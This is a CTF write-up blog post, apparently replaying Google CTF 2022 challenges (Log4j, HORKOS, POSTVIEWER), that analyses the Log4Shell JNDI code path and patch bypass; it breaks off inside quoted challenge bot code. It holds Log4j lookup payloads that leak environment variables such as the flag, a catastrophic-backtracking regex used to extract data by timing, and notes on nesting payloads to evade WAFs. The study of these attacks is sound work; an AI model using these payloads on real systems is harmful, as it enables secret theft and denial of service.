<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>GoogleCTF2022复现 | Dem0のblog</title><meta name="keywords" content="CTF复现"><meta name="author" content="Dem0"><meta name="copyright" content="Dem0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Log4J Log4j2源码解析  刚好这段时间在复现googlectf，又刚好碰到了这道题目，所以趁着这个机会来对题目进行复现的同时，重新学习一下log4j2的核弹级别漏洞。 题目主体的代码逻辑很简单，就是会使用LOGGER.info来输出所有的cmd和args。因此很同意想到之前的那个核弹级别的漏洞，但是发现版本不在影响范围内，所以只有作罢。配置文件解析。首先我们从配置文件开始看。 &lt;C">
<meta property="og:type" content="article">
<meta property="og:title" content="GoogleCTF2022复现">
<meta property="og:url" content="https://dem0dem0.top/2022/07/20/GoogleCTF2022%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="Dem0のblog">
<meta property="og:description" content="Log4J Log4j2源码解析  刚好这段时间在复现googlectf，又刚好碰到了这道题目，所以趁着这个机会来对题目进行复现的同时，重新学习一下log4j2的核弹级别漏洞。 题目主体的代码逻辑很简单，就是会使用LOGGER.info来输出所有的cmd和args。因此很同意想到之前的那个核弹级别的漏洞，但是发现版本不在影响范围内，所以只有作罢。配置文件解析。首先我们从配置文件开始看。 &lt;C">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://dem0dem0.top/img/conver3.png">
<meta property="article:published_time" content="2022-07-20T11:38:09.000Z">
<meta property="article:modified_time" content="2022-07-20T11:45:55.347Z">
<meta property="article:author" content="Dem0">
<meta property="article:tag" content="CTF复现">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://dem0dem0.top/img/conver3.png"><link rel="shortcut icon" href="https://q1.qlogo.cn/g?b=qq&nk=79475432&s=640"><link rel="canonical" href="https://dem0dem0.top/2022/07/20/GoogleCTF2022%E5%A4%8D%E7%8E%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'GoogleCTF2022复现',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-07-20 19:45:55'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="Dem0のblog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://q1.qlogo.cn/g?b=qq&amp;nk=79475432&amp;s=640" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/movie/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> Book</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/conver3.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Dem0のblog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/movie/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> Book</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">GoogleCTF2022复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-07-20T11:38:09.000Z" title="发表于 2022-07-20 19:38:09">2022-07-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-07-20T11:45:55.347Z" title="更新于 2022-07-20 19:45:55">2022-07-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E5%A4%8D%E7%8E%B0/">CTF复现</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>23分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="GoogleCTF2022复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="Log4J"><a href="#Log4J" class="headerlink" title="Log4J"></a>Log4J</h2><blockquote>
<p>Log4j2<a target="_blank" rel="noopener" href="https://dorgenjones.github.io/2017/03/13/%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7/log/3.log4j2%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/">源码解析</a></p>
</blockquote>
<p>刚好这段时间在复现googlectf，又刚好碰到了这道题目，所以趁着这个机会来对题目进行复现的同时，重新学习一下<code>log4j2</code>的核弹级别漏洞。</p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>主体的代码逻辑很简单，就是会使用<code>LOGGER.info</code>来输出所有的<code>cmd和args</code>。因此很同意想到之前的那个核弹级别的漏洞，但是发现版本不在影响范围内，所以只有作罢。<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40816738/article/details/111407832">配置文件解析</a>。首先我们从配置文件开始看。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_ERR&quot;</span>&gt;</span>// 默认不支持在控制台输出</span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d&#123;HH:mm:ss.SSS&#125; %-5level %logger&#123;36&#125; executing $&#123;sys:cmd&#125; - %msg %n&quot;</span>&gt;</span></span><br><span class="line">            //这个格式获取了环境变量中的cmd，那么再再次解析的时候又会使用一遍哦</span><br><span class="line">            <span class="tag">&lt;/<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;debug&quot;</span>&gt;</span>//  Root节点用来指定项目的根日志，如果没有单独指定Logger，那么就会默认使用该Root日志输出. level是debug，所以我们在控制台上也拿不到输出。</span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>综上就是要想办法把log4j的输出转到控制台上来。但是我们这里发现的所有的配置都是默认不输出的，那么如果我们想通过输出来解决这个问题就必须<code>换一个LOGGER</code>.获取FLAG的话，应该也是通过<code>environmentLookup</code>来进行获取。现在的payload初步为<code>$&#123;env:FLAG&#125;</code></p>
<p><img src="https://img.dem0dem0.top/images/image-20220719095204379.png" alt="image-20220719095204379"></p>
<p>但是现在面临的问题在于，如何将结果在控制台中输出出来，最后再被带出来呢？必须要找另外的<code>LOGGER</code>来进行外带，现在我们能够操作的就只有<code>$&#123;&#125;</code>。这样的数据，1. 找一个lookup. 2.  利用原本的代码逻辑来操作。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout">https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout</a></li>
<li><a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/manual/lookups.html">https://logging.apache.org/log4j/2.x/manual/lookups.html</a></li>
</ul>
<h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><h4 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h4><p><code>bundle</code>的lookup中可以将不合规范的key输出到控制台中，这样我们就可以看到外带出来的数据了。<code>$&#123;$&#123;a:-b&#125;undle:$&#123;env:FLAG&#125;&#125;</code>.或者<code>$&#123;$&#123;a:-j&#125;ava:$&#123;env:FLAG&#125;&#125;</code></p>
<p><img src="https://img.dem0dem0.top/images/image-20220719111519399.png" alt="image-20220719111519399"></p>
<p><img src="https://img.dem0dem0.top/images/image-20220719112602664.png" alt="image-20220719112602664"></p>
<h4 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h4><p><code>redos</code>来进行数据的爆破。主要是看到有一个操作是repeat，想办法把其中的数据leak出来，那么我们翻看官方文档。第一个<code>lookup</code>被ban了，所以第二个就要想其他的方法来把数据外带出来了。看了一下其中的操作，吸引我眼神的是<code>replace</code>.</p>
<p><img src="https://img.dem0dem0.top/images/image-20220719113024720.png" alt="image-20220719113024720"></p>
<p>后面看师傅们的做法是，这里面本身有一个<code>regex</code>，那么我们能不能从这个正则本身来进行一些处理，也就是<code>redos</code>.后面就看到了师傅们的下面的几个步骤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%replace&#123;S$&#123;env:FLAG&#125;E&#125;&#123;^SCTF.a((((((((((((((((((((.)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*E$&#125;&#123;&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p> 如果那個 <code>a</code> 有 match 到那它就會因為後面那些東西直接在 backtracking 時跑很久，直接吃 server 的 timeout (10s)，沒 match 到的話 regex engine 就不會嘗試去執行後面那些瘋狂 backtracking 的部分，所以 response 很快就會回來。</p>
</blockquote>
<p>maple师傅的解释很通俗易懂。</p>
<h3 id="Log4j核弹级漏洞调试"><a href="#Log4j核弹级漏洞调试" class="headerlink" title="Log4j核弹级漏洞调试"></a>Log4j核弹级漏洞调试</h3><p>本人前期因为实在是太懒了，一直没有时间来跟踪一下这个核弹级别的漏洞，趁着暑假有时间刚好来继续根一下这个核弹级别的漏洞，也是旧洞新调了，漏洞的调试分析止步于发出jndi请求，后续的利用，可以参考其他类型的相关调试。</p>
<blockquote>
<p>环境：log4j2: 2.14.0</p>
</blockquote>
<h4 id="简单复现"><a href="#简单复现" class="headerlink" title="简单复现"></a>简单复现</h4><p><img src="https://img.dem0dem0.top/images/image-20220719124626780.png" alt="image-20220719124626780"></p>
<p>漏洞触发十分简单，不愧是核弹级别的漏洞</p>
<h4 id="关键分析"><a href="#关键分析" class="headerlink" title="关键分析"></a>关键分析</h4><p><code>LogManager.getLogger(App.class);</code>来获取一个<code>Logger</code>对象，通过调用<code>debug/info/error/warn/fatal/trace/log</code>方法来记录日志。</p>
<p>首先第一步通常是<code>logIfEnabled:1983, AbstractLogger </code>来根据配置文件查看是否需要输出到控制台或者日志文件中去。漏洞的入口在于 <code>AbstractLogger#logMessage</code>.然后一路跟踪到<code>getLayout().encode(event, manager);</code>.开始使用<code>PatternLayout</code>对日志文件中的特殊符号进行解释，比如就有上面的链接中所涉及到的部分。最后落到<code>MessagePatternConverter</code>.</p>
<p>关键点就在于<code>MessagePatternConverter#format</code>，这里的config和noLookups是从配置文件中读取的，如果配置文件不为空，noLookups是<code>log4j2.formatMsgNoLookups</code>配置的值，默认为false，因为lookup默认是开启的。</p>
<p><img src="https://img.dem0dem0.top/images/image-20220719161415648.png" alt="image-20220719161415648"></p>
<p>然后使用<code>StrSubstitutor</code>来处理这里Value，自然而然地就进入<code>jndiLookup</code>。我们继续看<code>StrSubstitutor</code>里面的实现。</p>
<p><img src="https://img.dem0dem0.top/images/image-20220719162531518.png" alt="image-20220719162531518"></p>
<p>这个关键代码<code>substitute</code>，流程简单分析一下。</p>
<p><img src="https://img.dem0dem0.top/images/image-20220719163309923.png" alt="image-20220719163309923"></p>
<p>环境里面的变量简单解释一下(看样子应该也不需要解释了吧。)</p>
<p><img src="https://img.dem0dem0.top/images/image-20220719163507754.png" alt="image-20220719163507754"></p>
<p>开始找前缀，开始找后缀。</p>
<p><img src="https://img.dem0dem0.top/images/image-20220719164048895.png" alt="image-20220719164048895"></p>
<p>中间这里有一步是为了解析<code>$&#123;$&#123;&#125;:$&#123;&#125;&#125;</code>,套娃开始处理~，然后开始准备<code>后缀</code>。这个变量就是统计有没有套娃的。</p>
<p><img src="https://img.dem0dem0.top/images/image-20220719164521699.png" alt="image-20220719164521699"></p>
<p>后面就是对这个字符串的匹配。后续的代码不再分析，主要是匹配<code>套娃</code>和下面这种特殊的语法树处理。</p>
<p>- <code>:-</code> 是一个赋值关键字，如果程序处理到 <code>$&#123;aaaa:-bbbb&#125;</code> 这样的字符串，处理的结果将会是 <code>bbbb</code>，<code>:-</code> 关键字将会被截取掉，而之前的字符串都会被舍弃掉。<br>- <code>:\-</code> 是转义的 <code>:-</code>，如果一个用 <code>a:b</code> 表示的键值对的 key <code>a</code> 中包含 <code>:</code>，则需要使用转义来配合处理，例如 <code>$&#123;aaa:\\-bbb:-ccc&#125;</code>，代表 key 是，<code>aaa:bbb</code>，value 是 <code>ccc</code>。</p>
<p>后面在<code>resolveVariable</code>的函数开始最后的处理</p>
<p><img src="https://img.dem0dem0.top/images/image-20220719165316788.png" alt="image-20220719165316788"></p>
<p>然后在后面继续递归调用</p>
<p><img src="https://img.dem0dem0.top/images/image-20220719165414057.png" alt="image-20220719165414057"></p>
<p>这个对象在本质是一个<code>StrLookup</code>的代理，然后调用lookup.这个类在初始化的时候，会先将这些变量进行初始化，把其他的lookup进行保存。</p>
<p><img src="https://img.dem0dem0.top/images/image-20220719165758368.png" alt="image-20220719165758368"></p>
<h4 id="JNDI查询"><a href="#JNDI查询" class="headerlink" title="JNDI查询"></a>JNDI查询</h4><p><code>JndiManager.getDefaultManager()</code>获取<code>jndiManager</code>，其具体实现</p>
<p><img src="https://img.dem0dem0.top/images/image-20220719170635017.png" alt="image-20220719170635017"></p>
<p>使用了一个内部类来创建<code>JDNIManager</code></p>
<p><img src="https://img.dem0dem0.top/images/image-20220719170717444.png" alt="image-20220719170717444"></p>
<p>可以看到是创建了一个新的 InitialContext 实例，并作为参数传递用来创建 JndiManager，这个 Context 被保存在成员变量 context 中.<code>JndiManager#lookup</code> 方法则调用 <code>this.context.lookup()</code> 实现 JNDI 查询操作。实际上，JndiManager 这个类就是在本次漏洞中 Log4j2 包内的最终 sink 点。</p>
<h4 id="rc1以及bypass"><a href="#rc1以及bypass" class="headerlink" title="rc1以及bypass"></a>rc1以及bypass</h4><p>根据su-18师傅的文章分析得知，在本次更新主要做了以下几个方面的事情</p>
<ul>
<li>默认关闭了LOOKUP功能</li>
<li>将部分功能进行模块化， <code>SimpleMessagePatternConverter</code>，<code>FormattedMessagePatternConverter</code>、<code>LookupMessagePatternConverter</code>、<code>RenderingPatternConverter</code>，默认不再使用LOOKUP.</li>
<li>不直接采用<code>InitialContext</code>而是使用他的子类，并且添加JNDI协议白名单，主机名字白名单，白名单类名。</li>
</ul>
<p>bypass的点在于，由于校验逻辑有误，程序在 catch 住异常后没有 return，导致可以利用 <code>URISyntaxException</code> 异常来绕过校验，直接走到后面的 lookup。</p>
<h4 id="rc2"><a href="#rc2" class="headerlink" title="rc2"></a>rc2</h4><p>修复了这个异常，直接return了。其后面的版本大多就是直接不再支持日志信息的<code>lOOKUP</code>功能了，到后面由记录日志导致的攻击也就没有了。</p>
<h4 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h4><p>后面在bypass的过程中，运用到的攻击手法大致如下</p>
<ul>
<li><p>关键字截取(<code>-</code>来进行一个字符串拼接的功能实现)</p>
</li>
<li><p>嵌套(这个在后续会继续写文章来浅浅地分析一下)</p>
<blockquote>
<p>由于 Lookup 功能在替换字符时支持递归解析和替换，因此在构造 POC 时可以嵌套构造，增加 payload 复杂度，绕过 WAF 的同时，还可能给服务器带来解析负担，造成 DOS 漏洞。</p>
</blockquote>
</li>
<li><p>信息泄露</p>
</li>
<li><p>浅蓝师傅的博客里面提到了关于其他框架下面利用的一些方法。</p>
</li>
</ul>
<h2 id="HORKOS"><a href="#HORKOS" class="headerlink" title="HORKOS"></a>HORKOS</h2><p>本题目的两个trcik都是我之前没有见过的，简单记录一下，还涉及到了一个简单的语法树解析的问题，就是题目环境给的<code>shoplib</code>.关键的问题出在。</p>
<p><img src="https://img.dem0dem0.top/images/image-20220719232535641.png" alt="image-20220719232535641"></p>
<p>就相当于可以控制很多很多东西了，比如可以构造出<code>a.__prototype = xxx</code>,但是这个题目如果是在比赛的时候拿到，第一反应肯定是去拿<code>eval</code>,然后就会报一个比较bling的错误，<code>Uncaught TypeError: globalThis.eval is not a constructor</code>,所以我们能使用的就是<code>FUNCTION</code>,来新建。第二个trick，就在于<code>假设我return了一个对象，会调用这个对象的a.then</code>。也就是当一个promise执行完之后，都会默认去执行<code>then</code>函数中的东西，这里就是触发的位置。</p>
<p><img src="https://img.dem0dem0.top/images/image-20220719232942877.png" alt="image-20220719232942877"></p>
<p><img src="https://img.dem0dem0.top/images/image-20220719233101648.png" alt="image-20220719233101648"></p>
<p><img src="https://img.dem0dem0.top/images/image-20220719233109200.png" alt="image-20220719233109200"></p>
<h2 id="POSTVIEWER"><a href="#POSTVIEWER" class="headerlink" title="POSTVIEWER"></a>POSTVIEWER</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/super-yu/p/9480589.html">https://www.cnblogs.com/super-yu/p/9480589.html</a></p>
</blockquote>
<h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p><img src="https://img.dem0dem0.top/images/image-20220720180727128.png" alt="image-20220720180727128"></p>
<p>题目本身打开就是一个正常的文件预览，和一个给bot提交url的界面。没有什么特别需要注意的地方。先对功能进行小小地测试一下。发现了一点点奇怪的东西。</p>
<p><img src="https://img.dem0dem0.top/images/image-20220720181239049.png" alt="image-20220720181239049"></p>
<p>然后进行源码查看，<code>app.js</code>本身没有什么好看的。先看<code>bot.js</code>。代码注释写在下面了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Copyright 2022 Google LLC</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="comment"> * you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="comment"> * You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *      http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment"> * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line"><span class="comment"> * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment"> * See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment"> * limitations under the License.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> net = <span class="built_in">require</span>(<span class="string">&#x27;net&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; connect &#125; = <span class="built_in">require</span>(<span class="string">&#x27;http2&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">&#x27;puppeteer&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Deque</span> = <span class="built_in">require</span>(<span class="string">&quot;double-ended-queue&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>).<span class="property">webcrypto</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">DOMAIN</span> = process.<span class="property">env</span>.<span class="property">DOMAIN</span> || <span class="string">&#x27;postviewer-web.2022.ctfcompetition.com&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable constant_">DOMAIN</span> == <span class="literal">undefined</span>) <span class="keyword">throw</span> <span class="string">&#x27;domain undefined&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">sleep</span> = d =&gt; <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">r</span> =&gt;</span> <span class="built_in">setTimeout</span>(r, d));</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(process.<span class="property">env</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FLAG</span> = process.<span class="property">env</span>.<span class="property">FLAG</span> || <span class="string">&#x27;CTF&#123;part1_part2_part3_part4_part5&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PAGE_URL</span> = process.<span class="property">env</span>.<span class="property">PAGE_URL</span> || <span class="string">&#x27;https://postviewer-web.2022.ctfcompetition.com&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">REGISTERED_DOMAIN</span> = process.<span class="property">env</span>.<span class="property">REGISTERED_DOMAIN</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">BLOCK_SUBORIGINS</span> = process.<span class="property">env</span>.<span class="property">BLOCK_SUBORIGIS</span> == <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">BOT_TIMEOUT</span> = process.<span class="property">env</span>.<span class="property">BOT_TIMEOUT</span> || <span class="number">10000</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">MAX_BROWSERS</span> = process.<span class="property">env</span>.<span class="property">MAX_BROWSERS</span> || <span class="number">4</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET_TOKEN</span> = process.<span class="property">env</span>.<span class="property">SECRET_TOKEN</span> || <span class="string">&#x27;s333cret_b00t_3ndop1nt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Function copied from https://gist.github.com/chrisveness/43bcda93af9f646d083fad678071b90a */</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">aesGcmEncrypt</span>(<span class="params">plaintext, password</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> textEnc = <span class="keyword">new</span> <span class="title class_">TextEncoder</span>();</span><br><span class="line">  <span class="keyword">const</span> pwHash = <span class="keyword">await</span> crypto.<span class="property">subtle</span>.<span class="title function_">digest</span>(<span class="string">&#x27;SHA-256&#x27;</span>, textEnc.<span class="title function_">encode</span>(password));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> iv = crypto.<span class="title function_">getRandomValues</span>(<span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="number">12</span>));</span><br><span class="line">  <span class="keyword">const</span> ivStr = <span class="title class_">Array</span>.<span class="title function_">from</span>(iv).<span class="title function_">map</span>(<span class="function"><span class="params">b</span> =&gt;</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(b)).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> alg = &#123; <span class="attr">name</span>: <span class="string">&#x27;AES-GCM&#x27;</span>, <span class="attr">iv</span>: iv &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> key = <span class="keyword">await</span> crypto.<span class="property">subtle</span>.<span class="title function_">importKey</span>(<span class="string">&#x27;raw&#x27;</span>, pwHash, alg, <span class="literal">false</span>, [<span class="string">&#x27;encrypt&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">  <span 